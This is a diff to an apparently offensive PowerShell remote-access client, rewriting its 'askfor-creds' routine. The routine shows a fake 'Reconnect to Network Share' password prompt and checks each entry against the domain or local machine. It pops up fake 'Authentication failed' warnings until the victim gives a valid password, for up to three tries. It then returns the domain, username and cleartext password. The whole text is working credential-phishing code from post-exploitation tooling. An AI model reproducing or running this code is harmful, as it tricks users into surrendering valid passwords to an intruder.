@@ -300,16 +300,60 @@ function start-aclient {
 	#[->] thx Mubix for the idea ;) 
 	function askfor-creds { 
 
-		$credentials = $Host.UI.PromptForCredential('Reconnect to Network Share','',[Environment]::UserName,[Environment]::UserDomainName)
+		[int]$cnt = 1
+	
+		while ( $cnt -lt '4' ) {
 
-		$user   = [Environment]::UserName
-		$domain = [Environment]::UserDomainName
-		$pass = $credentials.getnetworkcredential().password
+			$user    = [Environment]::UserName
+			$domain  = [Environment]::UserDomainName	
+			
+			$credentials = $Host.UI.PromptForCredential('Reconnect to Network Share','',$user,[Environment]::UserDomainName)
+			$pass = $credentials.getnetworkcredential().password
 
-		$summary = 'Domain\User: ' + $domain + '\' + $user + ' | ' + 'Pass: ' + $pass 
+			if ((gwmi win32_computersystem).partofdomain -eq $true ) {
+		
+				Add-Type -assemblyname system.DirectoryServices.AccountManagement
+				$cntxtdom = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain)
+				$chkdom = $cntxtdom.ValidateCredentials($user,$pass)
+				
+				if ( $chkdom -eq $false ) {	
+			
+					Add-Type -AssemblyName System.Windows.Forms
+					$choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed, please enter correct password.", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+			
+				} else { break }
+			
+			} else {
+
+				Add-Type -assemblyname system.DirectoryServices.AccountManagement 
+				$localMachine = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+				$credtest = $localMachine.ValidateCredentials($user,$pass)
+			
+				if ( $credtest -eq $false ) { 
+			
+				Add-Type -assemblyname System.Windows.Forms
+				$choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed! Please enter correct password.", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+			
+				} else { break }
+
+			}
+			
+			$cnt++
+	
+		}
+	
+		if ( $cnt -eq '4' ) {
+	  
+			$summary = "[!] Attempt failed! Exceeded login attempts."
+		
+		} else { 
+	  
+			$summary = "[!] Successfully authenticated with domain! `n"
+			$summary += '[>] Domain\UserName: ' + $domain + '\' + $user + ' | ' + 'Pass: ' + $pass
+		
+		}
 	
 		return $summary
-
 	}
 
 	function gen-enccmd { 
